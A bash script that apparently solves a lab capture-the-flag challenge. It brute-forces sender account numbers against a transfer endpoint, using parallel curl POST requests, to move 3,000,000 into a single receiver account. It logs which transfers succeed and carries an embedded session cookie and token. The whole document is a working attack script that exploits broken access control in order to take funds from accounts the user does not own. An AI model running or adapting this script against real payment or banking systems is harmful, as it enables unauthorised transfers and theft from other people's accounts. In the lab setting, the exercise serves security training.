#!/bin/bash

# Fire the requests with up to 10 concurrent curl processes and print any senderAccountNumber that succeeds.
success_file="$(dirname "$0")/successful-transfers.txt"
: > "$success_file"
log_file="$(dirname "$0")/transfer.log"
: > "$log_file"

echo "Starting transfer attempts (1000-9999), writing successes to $success_file"
echo "Logging all responses to $log_file (also mirrored to stdout)."
echo "Successes still go to $success_file"

seq 1000 2000 | xargs -P 10 -I{} bash -c '
num="$1"
resp=$(curl -sS -w '\'' HTTPSTATUS:%{http_code}'\'' '\''https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cTransfer'\'' \
    -X POST \
    -H '\''User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0'\'' \
    -H '\''Accept: */*'\'' \
    -H '\''Accept-Language: en-US,en;q=0.5'\'' \
    -H '\''Accept-Encoding: gzip, deflate, br, zstd'\'' \
    -H '\''Content-Type: application/x-www-form-urlencoded'\'' \
    -H '\''X-Requested-With: XMLHttpRequest'\'' \
    -H '\''Origin: https://shepherd.hs25.isf.hslu-edu.ch'\'' \
    -H '\''Connection: keep-alive'\'' \
    -H '\''Referer: https://shepherd.hs25.isf.hslu-edu.ch/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c.jsp'\'' \
    -H '\''Cookie: JSESSIONID=9F62C20DD8AB8D617F2063ACB068E1DE; token=-139144933759621248217061075988243322970'\'' \
    -H '\''Sec-Fetch-Dest: empty'\'' \
    -H '\''Sec-Fetch-Mode: cors'\'' \
    -H '\''Sec-Fetch-Site: same-origin'\'' \
    -H '\''DNT: 1'\'' \
    -H '\''Sec-GPC: 1'\'' \
    -H '\''TE: trailers'\'' \
    --data-raw "senderAccountNumber=$num&recieverAccountNumber=1631&transferAmount=3000000")

body=${resp% HTTPSTATUS:*}
status=${resp##*HTTPSTATUS:}
echo "sender=$num status=$status body=$body" | tee -a "$3"

if echo "$body" | grep -qi "succeed"; then
    echo "Succeeded senderAccountNumber=$num" | tee -a "$2"
fi
' _ {} "$success_file" "$log_file"
